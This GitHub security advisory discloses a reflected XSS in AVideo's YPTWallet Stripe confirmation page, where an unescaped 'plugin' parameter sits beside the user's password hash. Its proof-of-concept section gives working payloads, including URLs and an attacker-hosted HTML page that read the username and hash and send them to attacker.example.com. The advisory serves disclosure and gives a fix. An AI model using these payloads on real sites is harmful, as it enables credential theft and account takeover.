# [H] AVideo Vulnerable to Reflected XSS via Unsanitized plugin Parameter in YPTWallet Stripe Payment Page

## Summary
Severity: High
Advisory: GHSA-pm37-62g7-p768
CVE: CVE-2026-34375
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-30
Source: https://github.com/advisories/GHSA-pm37-62g7-p768
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The YPTWallet Stripe payment confirmation page directly echoes the `$_REQUEST['plugin']` parameter into a JavaScript block without any encoding or sanitization. The `plugin` parameter is not included in any of the framework's input filter lists defined in `security.php`, so it passes through completely raw. An attacker can inject arbitrary JavaScript by crafting a malicious URL and sending it to a victim user.

The same script block also outputs the current user's username and password hash via `User::getUserName()` and `User::getUserPass()`, meaning a successful XSS exploitation can immediately exfiltrate these credentials.

## Details

The Stripe confirmation page renders the `plugin` parameter directly into a `<script>` block:

```php
// plugin/YPTWallet/plugins/YPTWalletStripe/confirmButton.php:116
"plugin": "<?php echo @$_REQUEST['plugin']; ?>",
```

This appears inside a `$.ajax()` data object within a `<script>` tag. Because the value is injected into a JavaScript string context (not HTML), standard HTML entity encoding would not be sufficient even if it were applied. However, no encoding of any kind is performed.

The `plugin` parameter is not present in any of the sanitization or filtering arrays in `security.php`, so it arrives completely unmodified.

Immediately adjacent to the injection point, the script also exposes user credentials:

```php
// plugin/YPTWallet/plugins/YPTWalletStripe/confirmButton.php:117-118
"user": "<?php echo User::getUserName() ?>",
"pass": "<?php echo User::getUserPass(); ?>",
```

No Content-Security-Policy headers are configured on the application, so inline script execution is unrestricted.

## Proof of Concept

The XSS is reachable through the `addFunds.php` page which includes the vulnerable `confirmButton.php` template:

```
https://your-avideo-instance.com/plugin/YPTWallet/view/addFunds.php?plugin=%22}})});alert(document.domain);console.log({/*
```

The injected value closes the JSON string and the `$.ajax()` call, then executes `alert(document.domain)`. The response contains the payload unencoded in the script block:

```javascript
"plugin": ""}})});alert(document.domain);console.log({/*",
```

Credential exfiltration payload:

```
https://your-avideo-instance.com/plugin/YPTWallet/plugins/YPTWalletStripe/confirmButton.php?plugin=",x:fetch('https://attacker.example.com/steal?'+document.querySelector('script').textContent.match(/pass.*?"(.*?)"/)[1]),y:"
```

Simplified credential theft using the same-page credential leak:

```html
<!-- Host this on attacker.example.com and send the link to a victim -->
<html>
<body>
<script>
  // The confirmButton.php page outputs user/pass in the script block.
  // XSS lets us read it directly.
  var payload = encodeURIComponent(
    '",x:(function(){' +
    'var s=document.querySelector("script").textContent;' +
    'var u=s.match(/"user":"([^"]+)"/)[1];' +
    'var p=s.match(/"pass":"([^"]+)"/)[1];' +
    'new Image().src="https://attacker.example.com/log?u="+u+"&p="+p;' +
    '})(),y:"'
  );
  window.location = "https://your-avideo-instance.com/plugin/YPTWallet/plugins/YPTWalletStripe/confirmButton.php?plugin=" + payload;
</script>
</body>
</html>
```

Reproduction steps:

1. Navigate to the basic XSS URL above (substitute your target instance).
2. Observe the JavaScript alert box confirming code execution.
3. View the page source to confirm that `User::getUserName()` and `User::getUserPass()` are present in the same script block.
4. Use the credential exfiltration payload to demonstrate data theft.

## Impact

An attacker can execute arbitrary JavaScript in the context of any authenticated user who clicks a crafted link. The impact is amplified by the credential leak on the same page:

- **Immediate credential theft**: The page already renders the victim's username and password hash in the script block. The XSS payload can read and exfiltrate these values without any additional requests.
- **Session hijacking**: Steal session cookies and impersonate the victim.
- **Payment manipulation**: Since this is a payment confirmation page, the attacker can modify payment amounts, redirect payment confirmations, or trigger unauthorized transactions.
- **Account takeover**: Combine the stolen password hash with the username for offline cracking or direct replay.

The lack of CSP headers means there are no browser-side mitigations against the injected scripts.

- **CWE**: CWE-79 (Cross-Site Scripting - Reflected)
- **Severity**: High (CVSS 8.1)

## Recommended Fix

Apply `htmlspecialchars()` to the `plugin` parameter at `plugin/YPTWallet/plugins/YPTWalletStripe/confirmButton.php:116`:

```php
// plugin/YPTWallet/plugins/YPTWalletStripe/confirmButton.php:116
// Before:
"plugin": "<?php echo @$_REQUEST['plugin']; ?>",

// After:
"plugin": "<?php echo htmlspecialchars(@$_REQUEST['plugin'], ENT_QUOTES, 'UTF-8'); ?>",
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-pm37-62g7-p768
- https://nvd.nist.gov/vuln/detail/CVE-2026-34375
- https://github.com/WWBN/AVideo/commit/fa0bc102493a15d79fe03f86c07ab7ca1b5b63e2
- https://github.com/WWBN/AVideo
